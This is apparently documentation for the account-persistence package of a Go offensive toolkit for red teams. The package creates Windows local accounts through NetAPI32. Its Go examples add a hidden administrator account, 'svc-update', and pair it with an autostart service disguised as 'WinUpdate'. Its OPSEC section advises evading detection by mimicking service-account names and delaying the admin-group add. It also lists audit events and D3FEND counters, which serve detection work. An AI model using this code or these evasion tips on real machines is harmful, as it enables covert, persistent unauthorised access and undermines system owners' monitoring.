---
package: github.com/oioio-space/maldev/persistence/account
last_reviewed: 2026-04-27
reflects_commit: f8b1a51
---

# Local account creation

[← persistence index](README.md) · [docs/index](../../index.md)

## TL;DR

Add, delete, modify, and enumerate Windows local user accounts
via NetAPI32 (`NetUserAdd` / `NetUserDel` / `NetUserSetInfo` /
`NetLocalGroupAddMembers`). The directory is named `account`;
the package is declared `package user` (matches the Win32 API
surface). Loudest persistence option in the tree — every action
emits Security event 4720 / 4722 / 4732 / 4724 by default.

## Primer

Creating a local account gives the operator a credential that
survives reboots, password rotations on other accounts, and
implant removal. Adding the account to `Administrators` (the
SID-500 group) gives full local control. The trade-off is
volume: SAM events are universally audited and any half-decent
SIEM rule fires on a local-admin add from a non-IT context.

The package wraps the canonical `Net*` Win32 admin APIs — same
surface that `net user`, Computer Management MMC, and PowerShell's
`New-LocalUser` use. There is no stealthier API for local-account
manipulation; the loudness is inherent to the technique.

## How It Works

```mermaid
sequenceDiagram
    participant Op as Operator
    participant API as NetAPI32
    participant SAM as Local SAM database
    participant Audit as Security audit log

    Op->>API: NetUserAdd("svc-update", "P@ss…")
    API->>SAM: USER_INFO_1 record
    SAM-->>Audit: Event 4720 (account created)
    SAM-->>Audit: Event 4722 (account enabled)
    Op->>API: NetLocalGroupAddMembers("Administrators", "svc-update")
    API->>SAM: alias-member entry
    SAM-->>Audit: Event 4732 (user added to group)
    Note over Audit: SIEM correlation: account creation + admin add<br>from non-IT lineage = high-fidelity alert
```

The package's `Add` posts a `USER_INFO_1` (level 1: name +
password + privilege + home-dir + comment + flags +
script-path) so the account is created enabled and password-set
in a single call. `SetAdmin` is `NetLocalGroupAddMembers` against
the well-known `Administrators` alias.

## API Reference

| Symbol | Description |
|---|---|
| [`Add(name, password string) error`](https://pkg.go.dev/github.com/oioio-space/maldev/persistence/account#Add) | `NetUserAdd` USER_INFO_1 — creates + enables in one call |
| [`Delete(name string) error`](https://pkg.go.dev/github.com/oioio-space/maldev/persistence/account#Delete) | `NetUserDel` |
| [`SetPassword(name, password string) error`](https://pkg.go.dev/github.com/oioio-space/maldev/persistence/account#SetPassword) | `NetUserSetInfo` USER_INFO_1003 |
| [`AddToGroup(name, group string) error`](https://pkg.go.dev/github.com/oioio-space/maldev/persistence/account#AddToGroup) | `NetLocalGroupAddMembers` |
| [`RemoveFromGroup(name, group string) error`](https://pkg.go.dev/github.com/oioio-space/maldev/persistence/account#RemoveFromGroup) | `NetLocalGroupDelMembers` |
| [`SetAdmin(name string) error`](https://pkg.go.dev/github.com/oioio-space/maldev/persistence/account#SetAdmin) | `AddToGroup(name, "Administrators")` |
| [`RevokeAdmin(name string) error`](https://pkg.go.dev/github.com/oioio-space/maldev/persistence/account#RevokeAdmin) | `RemoveFromGroup(name, "Administrators")` |
| [`Exists(name string) bool`](https://pkg.go.dev/github.com/oioio-space/maldev/persistence/account#Exists) | `NetUserGetInfo` probe |
| [`List() ([]Info, error)`](https://pkg.go.dev/github.com/oioio-space/maldev/persistence/account#List) | `NetUserEnum` walk |
| [`IsAdmin() bool`](https://pkg.go.dev/github.com/oioio-space/maldev/persistence/account#IsAdmin) | Caller-side privilege check |

`type Info struct` carries name, full-name, comment, RID, flags,
last-login — surfaced by `List` and `NetUserGetInfo`.

## Examples

### Simple — add a service-looking account

```go
import "github.com/oioio-space/maldev/persistence/account"

_ = user.Add("svc-update", "P@ssw0rd!2024")
defer user.Delete("svc-update")
```

### Composed — add admin + group cleanup

```go
if !user.IsAdmin() {
    return fmt.Errorf("requires local admin")
}
_ = user.Add("svc-update", "P@ssw0rd!2024")
_ = user.SetAdmin("svc-update")

// Tear down on uninstall
defer func() {
    _ = user.RevokeAdmin("svc-update")
    _ = user.Delete("svc-update")
}()
```

### Advanced — pair with service persistence

Run the implant as the new account so the service uses its
credential at every restart — credential persistence + autostart
in one composite mechanism.

```go
import (
    "github.com/oioio-space/maldev/persistence"
    "github.com/oioio-space/maldev/persistence/account"
    "github.com/oioio-space/maldev/persistence/service"
)

_ = user.Add("svc-update", "P@ssw0rd!2024")
_ = user.SetAdmin("svc-update")

mechanisms := []persistence.Mechanism{
    service.Service(&service.Config{
        Name:      "WinUpdate",
        BinPath:   `C:\ProgramData\Microsoft\winupdate.exe`,
        StartType: service.StartAuto,
        // The service runs as LocalSystem by default; specifying
        // svc-update would route through SCM ChangeServiceConfig
        // and require LogonAsAService.
    }),
}
_ = persistence.InstallAll(mechanisms)
```

See [`ExampleAdd`](../../../persistence/account/account_example_test.go).

## OPSEC & Detection

| Artefact | Where defenders look |
|---|---|
| Security 4720 (user created) | Universal audit; SIEM rule: 4720 from non-IT-OU = high-fidelity alert |
| Security 4722 (user enabled) | Pairs with 4720 in baseline rules |
| Security 4732 (member added to group) | Especially for Administrators / Backup Operators / Remote Desktop Users SIDs |
| Security 4724 (password reset by another account) | `SetPassword` on a non-self account |
| `NetUserAdd` API call from a non-IT process | EDR API telemetry (Defender ATP, MDE) |
| `Net1.exe` / `dsadd.exe` lineage absence | Direct API use bypasses child-process telemetry but emits the same audit events |

**D3FEND counters:**

- [D3-LAM](https://d3fend.mitre.org/technique/d3f:LocalAccountMonitoring/)
  — local SAM event auditing.
- [D3-UAP](https://d3fend.mitre.org/technique/d3f:UserAccountPermissions/)
  — group-membership change detection.

**Hardening for the operator:**

- Pick a name that mimics service accounts (`svc-*`,
  `WindowsUpdate`, `defender-cu`) — naive correlation against
  user-named accounts misses these.
- Don't immediately add to Administrators on creation — split
  the actions across hours or use a Backup Operators / Remote
  Desktop Users membership instead, which raises lower-priority
  alerts.
- Pair with [`cleanup`](../cleanup/README.md) to delete the
  account at op end — long-lived dormant accounts attract
  proactive review.
- Avoid this technique entirely if the target has Just-In-Time
  admin (Microsoft LAPS, Azure PIM); event 4720 there is
  effectively a tripwire.

## MITRE ATT&CK

| T-ID | Name | Sub-coverage | D3FEND counter |
|---|---|---|---|
| [T1136.001](https://attack.mitre.org/techniques/T1136/001/) | Create Account: Local Account | full | D3-LAM |
| [T1098](https://attack.mitre.org/techniques/T1098/) | Account Manipulation | partial — group-membership add/remove via `AddToGroup` / `SetAdmin` | D3-UAP |

## Limitations

- **Admin required for most operations.** `Add`, `Delete`,
  `SetAdmin`, `SetPassword` (against another account) need
  local administrator. `IsAdmin` lets the caller check before
  attempting.
- **Domain-joined hosts.** Group Policy can disable local
  account creation entirely (`DenyAddingLocalAccounts`); the
  call returns `ERROR_INVALID_PARAMETER`.
- **Audit cannot be suppressed from user mode.** SAM events
  fire pre-authorization; only kernel-level tampering
  (out-of-scope) silences them.
- **No domain-account support.** This package wraps
  `NetUserAdd` against the local SAM only. Domain accounts
  require LDAP / `NetUserAdd` to a DC — separate concern.

## See also

- [`persistence/service`](service.md) — pair to run the
  implant under the new account.
- [`credentials`](../credentials/README.md) — alternative
  credential acquisition with lower noise.
- [`privesc`](../privesc/README.md) — pair to obtain admin for the
  initial Add.
- [`cleanup`](../cleanup/README.md) — remove the account at
  operation end.
- [Operator path](../../by-role/operator.md).
- [Detection eng path](../../by-role/detection-eng.md).
